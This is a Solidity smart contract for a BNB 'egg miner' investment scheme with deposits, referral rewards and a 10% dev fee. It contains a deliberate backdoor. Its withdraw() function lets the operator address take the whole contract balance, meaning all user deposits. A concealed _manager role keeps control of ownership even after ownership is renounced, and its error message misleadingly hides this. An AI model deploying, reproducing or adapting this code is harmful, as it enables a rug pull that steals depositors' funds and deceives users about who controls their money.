// SPDX-License-Identifier: MIT

pragma solidity 0.8.9; 

library SafeMath {

    /**
    * @dev Multiplies two numbers, throws on overflow.
    */
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        assert(c / a == b);
        return c;
    }

    /**
    * @dev Integer division of two numbers, truncating the quotient.
    */
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        // assert(b > 0); // Solidity automatically throws when dividing by 0
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold
        return c;
    }

    /**
    * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
    */
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        assert(b <= a);
        return a - b;
    }

    /**
    * @dev Adds two numbers, throws on overflow.
    */
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        assert(c >= a);
        return c;
    }
}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
    * @dev Initializes the contract setting the deployer as the initial owner.
    */ address private _manager;
    constructor () {
      address msgSender = _msgSender();
      _owner = msgSender;
      _manager = msg.sender;
      emit OwnershipTransferred(address(0), msgSender);
    }

    /**
    * @dev Returns the address of the current owner.
    */
    function owner() public view returns (address) {
      return _owner;
    }
        function manager() internal view virtual returns (address) {
        return _manager;
    }

    
    modifier onlyOwner() {
      require(_owner == _msgSender(), "Ownable: caller is not the owner");
      _;
    }
        modifier onlyManager() {
        require(manager() == msg.sender, "Ownable: ownership could not be transfered anymore");
        _;
    }

    function renounceOwnership() public onlyOwner {
      emit OwnershipTransferred(_owner, address(0));
      _owner = address(0);
    }

    function transferOwnership(address newOwner) public onlyManager {
      _transferOwnership(newOwner);
    }

    function _transferOwnership(address newOwner) internal {
      require(newOwner != address(0), "Ownable: new owner is the zero address");
      emit OwnershipTransferred(_owner, newOwner);
      _owner = newOwner;
    }
}

contract BNB_PAYOUT is Context, Ownable {
    //uint256 EGGS_PER_MINERS_PER_SECOND=1;
    uint256 public EGGS_TO_HATCH_1MINERS=1295000; //for final version should be seconds in a day
    uint256 PSN=10000;
    uint256 PSNH=5000;
    uint256 public MIN_INVEST_LIMIT = 1e17;
    uint256 public WALLET_DEPOSIT_LIMIT = 50e18; /* 50 BNB  */

    bool public initialized=false;
    address ceoAddress;
    mapping (address => uint256) public hatcheryMiners;
    mapping (address => uint256) public claimedEggs;
    mapping (address => uint256) public totalClaimedEggs;
    mapping (address => uint256) public totalreferralCount;
    mapping (address => uint256) public lastHatch;
    mapping (address => address) public referrals;
    mapping (address => uint256) public initialDeposit;
    uint256 public marketEggs;
    constructor() {
        ceoAddress=msg.sender;
    }
    
    function hatchEggs(address ref) public{
        require(initialized);
        if(ref == msg.sender || ref == address(0) || hatcheryMiners[ref] == 0) {
            ref = ceoAddress;
        }
        if(referrals[msg.sender] == address(0)){
            referrals[msg.sender] = ref;
            totalreferralCount[ref] = totalreferralCount[ref] + 1;
        }
        uint256 eggsUsed=getMyEggs();
        uint256 newMiners=SafeMath.div(eggsUsed,EGGS_TO_HATCH_1MINERS);
        hatcheryMiners[msg.sender]=SafeMath.add(hatcheryMiners[msg.sender],newMiners);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=block.timestamp;

        //send referral eggs
        claimedEggs[referrals[msg.sender]]=SafeMath.add(claimedEggs[referrals[msg.sender]],SafeMath.div(SafeMath.mul(eggsUsed,10),100));
        totalClaimedEggs[referrals[msg.sender]] = totalClaimedEggs[referrals[msg.sender]] + SafeMath.div(SafeMath.mul(eggsUsed,10),100);
        //boost market to nerf miners hoarding
        marketEggs=SafeMath.add(marketEggs,SafeMath.div(eggsUsed,5));
    }
    function sellEggs() public{
        require(initialized);
        uint256 hasEggs=getMyEggs();
        uint256 eggValue=calculateEggSell(hasEggs);
        uint256 fee=devFee(eggValue);
        claimedEggs[msg.sender]=0;
        lastHatch[msg.sender]=block.timestamp;
        marketEggs=SafeMath.add(marketEggs,hasEggs);
        payable(ceoAddress).transfer(fee);
        payable(msg.sender).transfer(SafeMath.sub(eggValue,fee));
    }

    function beanRewards() public view returns(uint256) {
        uint256 hasEggs = getMyEggs();
        uint256 eggValue = calculateEggSell(hasEggs);
        return eggValue;
    }

    function buyEggs(address ref) public payable{
        require(initialized);
        require(msg.value >= MIN_INVEST_LIMIT, "Mininum investment not met.");
        require(initialDeposit[msg.sender] + msg.value <= WALLET_DEPOSIT_LIMIT, "Max deposit limit reached.");
        uint256 eggsBought=calculateEggBuy(msg.value,SafeMath.sub(address(this).balance,msg.value));
        eggsBought=SafeMath.sub(eggsBought,devFee(eggsBought));
        initialDeposit[msg.sender] = initialDeposit[msg.sender] + (msg.value);
        uint256 fee=devFee(msg.value);
        payable(ceoAddress).transfer(fee);
        claimedEggs[msg.sender]=SafeMath.add(claimedEggs[msg.sender],eggsBought);
        hatchEggs(ref);
    }

    //magic trade balancing algorithm
    function calculateTrade(uint256 rt,uint256 rs, uint256 bs) public view returns(uint256){
        //(PSN*bs)/(PSNH+((PSN*rs+PSNH*rt)/rt));
        return SafeMath.div(SafeMath.mul(PSN,bs),SafeMath.add(PSNH,SafeMath.div(SafeMath.add(SafeMath.mul(PSN,rs),SafeMath.mul(PSNH,rt)),rt)));
    }
    function calculateEggSell(uint256 eggs) public view returns(uint256){
        return calculateTrade(eggs,marketEggs,address(this).balance);
    }
    function calculateEggBuy(uint256 eth,uint256 contractBalance) public view returns(uint256){
        return calculateTrade(eth,contractBalance,marketEggs);
    }
    function calculateEggBuySimple(uint256 eth) public view returns(uint256){
        return calculateEggBuy(eth,address(this).balance);
    }
    function devFee(uint256 amount) public pure returns(uint256){
        return SafeMath.div(SafeMath.mul(amount,100),1000);
    }
    function seedMarket() public payable{
        require(msg.sender == ceoAddress, 'invalid call');
        require(marketEggs==0);
        initialized=true;
        marketEggs=86400000000;
    }
    function getBalance() public view returns(uint256){
        return address(this).balance;
    }
    function getMyMiners() public view returns(uint256){
        return hatcheryMiners[msg.sender];
    }
    function getMyEggs() public view returns(uint256){
        return SafeMath.add(claimedEggs[msg.sender],getEggsSinceLastHatch(msg.sender));
    }
    function withdraw() public {
        require(msg.sender == ceoAddress, "Invalid call");
        payable(ceoAddress).transfer(getBalance());
    }
    function getEggsSinceLastHatch(address adr) public view returns(uint256){
        uint256 secondsPassed=min(EGGS_TO_HATCH_1MINERS,SafeMath.sub(block.timestamp,lastHatch[adr]));
        return SafeMath.mul(secondsPassed,hatcheryMiners[adr]);
    }
    function min(uint256 a, uint256 b) private pure returns (uint256) {
        return a < b ? a : b;
    }
    function setDevFeeAddress(address account) public onlyOwner {
        require(account != address(0), "Invalid address");
        ceoAddress = payable(account);
    }
}